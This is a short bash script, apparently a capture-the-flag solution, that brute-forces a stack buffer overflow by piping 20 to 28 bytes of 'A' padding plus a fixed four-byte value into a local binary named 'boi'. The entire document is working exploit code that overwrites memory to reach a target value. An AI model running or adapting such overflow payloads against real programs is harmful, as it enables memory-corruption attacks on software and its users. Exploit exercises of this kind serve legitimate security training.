#! /bin/bash

for i in {20..28}; do echo $i; python -c "print 'A'*$i+'\xee\xba\xf3\xca'" | ./boi; done

